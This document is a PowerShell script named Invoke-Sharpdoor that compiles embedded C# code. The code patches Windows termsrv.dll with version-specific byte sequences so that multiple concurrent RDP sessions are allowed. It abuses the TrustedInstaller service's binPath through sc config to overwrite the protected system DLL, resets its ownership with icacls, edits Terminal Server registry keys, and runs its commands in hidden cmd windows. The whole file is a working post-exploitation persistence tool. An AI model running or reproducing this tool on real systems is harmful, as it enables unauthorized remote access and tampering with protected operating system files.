function Invoke-Sharpdoor
{

$door = @"
using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Security.Permissions;
using System.Security.Principal;

namespace SharpDoor
{
    public class Program
    {
        public static byte[] PatchFind = { };
        public static byte[] PatchReplace = {
            0xB8,
            0x00,
            0x01,
            0x00,
            0x00,
            0x89,
            0x81,
            0x38,
            0x06,
            0x00,
            0x00,
            0x90
        };

        public static void Main()
        {

            Console.WriteLine(@"   _____ _                      _____                   ");
            Console.WriteLine(@"  / ____| |                    |  __ \                  ");
            Console.WriteLine(@" | (___ | |__   __ _ _ __ _ __ | |  | | ___   ___  _ __ ");
            Console.WriteLine(@"  \___ \| '_ \ / _` | '__| '_ \| |  | |/ _ \ / _ \| '__|");
            Console.WriteLine(@"  ____) | | | | (_| | |  | |_) | |__| | (_) | (_) | |   ");
            Console.WriteLine(@" |_____/|_| |_|\__,_|_|  | .__/|_____/ \___/ \___/|_|   ");
            Console.WriteLine(@"                         | |                            ");
            Console.WriteLine(@"  v1.0.0                 |_|                            ");

            Console.WriteLine("\nAllow Multiple RDP (Remote Desktop) Sessions By Patching termsrv.dll File\n");

            if (!isAdminRight())
            {
                Console.WriteLine("[!] The current session does not have administrative rights.");
            }

            try
            {
                string termsrv_src = @"C:\Windows\System32\termsrv.dll";
                FileVersionInfo ver = FileVersionInfo.GetVersionInfo(termsrv_src);
                Console.WriteLine("[*] Termsrv.dll Version : " + ver.ProductVersion);
                TermsrvPatchVersion(ver.ProductVersion);

                Console.WriteLine("[*] Stop termservice");
                executeCommand(@"net stop termservice /y");

                Console.WriteLine(@"[*] Backup termsrv.dll to C:\Users\Public\termsrv.dll");

                executeCommand("sc config TrustedInstaller binPath= \"cmd /c copy C:\\Windows\\System32\\termsrv.dll C:\\Users\\Public\\termsrv.dll\"");
                executeCommand("sc start \"TrustedInstaller\"");
                Thread.Sleep(2000);

                Console.WriteLine("\n[*] Attempting to patch termsrv.dll");
                PatchFile(@"C:\Users\Public\termsrv.dll", @"C:\Users\Public\termsrv.patch.dll");
                Thread.Sleep(2000);

                executeCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Users\\Public\\termsrv.patch.dll C:\\Windows\\System32\\termsrv.dll\"");
                executeCommand("sc start \"TrustedInstaller\"");
                Thread.Sleep(2000);

                executeCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /setowner \"NT SERVICE\\TrustedInstaller\"");
                executeCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /grant \"NT SERVICE\\TrustedInstaller:(RX)\"");

                Console.WriteLine("[*] Setting Registry Terminal Server\\fSingleSessionPerUser to 0");
                RegistryKey reg_key1 = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
                reg_key1.SetValue("fSingleSessionPerUser", 0, RegistryValueKind.DWord);

                Console.WriteLine("[*] Setting Registry Terminal Server\\TSAppAllowList\\fDisabledAllowList to 1");
                RegistryKey reg_key2 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList");
                reg_key2.SetValue("fDisabledAllowList", 1, RegistryValueKind.DWord);

                Console.WriteLine("[*] Start termservice");
                executeCommand(@"net start termservice /y");

                Console.WriteLine("[*] Done");
            }
            catch (Exception e)
            {
                Console.WriteLine("\r\n[!] Unhandled SharpDoor exception:\r\n");
                Console.WriteLine(e);
            }
        }

        static bool executeCommand(string command)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;

            return process.Start();
        }

        static string GetMd5Hash(string input)
        {
            MD5 md5Hash = MD5.Create();

            // Convert the input string to a byte array and compute the hash.
            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

            // Create a new Stringbuilder to collect the bytes
            // and create a string.
            StringBuilder sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data 
            // and format each one as a hexadecimal string.
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }

            // Return the hexadecimal string.
            return sBuilder.ToString();
        }

        public static bool isAdminRight()
        {
            bool isElevated;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);

                return isElevated;
            }
        }

        private static void TermsrvPatchVersion(string termsrvVersion)
        {
            // www.mysysadmintips.com/windows/clients/545-multiple-rdp-remote-desktop-sessions-in-windows-10
            if (termsrvVersion == "10.0.17763.1")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x7F,
                    0x2C,
                    0x01,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.17763.437")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x3B,
                    0x2B,
                    0x01,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.17134.1")
            {
                PatchFind = new byte[] {
                    0x8B,
                    0x99,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x8B,
                    0xB9,
                    0x38,
                    0x06,
                    0x00,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.16299.15")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0xB1,
                    0x7D,
                    0x02,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.10240.16384")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x73,
                    0x42,
                    0x02,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.10586.0")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x3F,
                    0x42,
                    0x02,
                    0x00
                };
            }
            else
            {
                Console.WriteLine("[!] Unknown Version");
                
            }
        }

        private static bool DetectPatch(byte[] sequence, int position)
        {
            if (position + PatchFind.Length > sequence.Length) return false;
            for (int p = 0; p < PatchFind.Length; p++)
            {
                if (PatchFind[p] != sequence[position + p]) return false;
            }
            return true;
        }

        private static void PatchFile(string originalFile, string patchedFile)
        {
            // Ensure target directory exists.
            var targetDirectory = Path.GetDirectoryName(patchedFile);

            // Read file bytes.
            byte[] fileContent = File.ReadAllBytes(originalFile);

            for (int p = 0; p < fileContent.Length; p++)
            {
                bool isPatch = DetectPatch(fileContent, p);
                if (!isPatch) continue;

                for (int w = 0; w < PatchFind.Length; w++)
                {
                    fileContent[p + w] = PatchReplace[w];
                }
            }

            // Save it to another location.
            File.WriteAllBytes(patchedFile, fileContent);

            Console.WriteLine("\nOriginal File Hash : " + GetMd5Hash(originalFile));
            Console.WriteLine("Patched File Hash : " + GetMd5Hash(patchedFile));
            Console.WriteLine("\n[*] " + patchedFile + " was patched successfully\n");
        }
    }
}
"@

Add-Type -TypeDefinition $door -Language CSharp

[SharpDoor.Program]::Main()

}
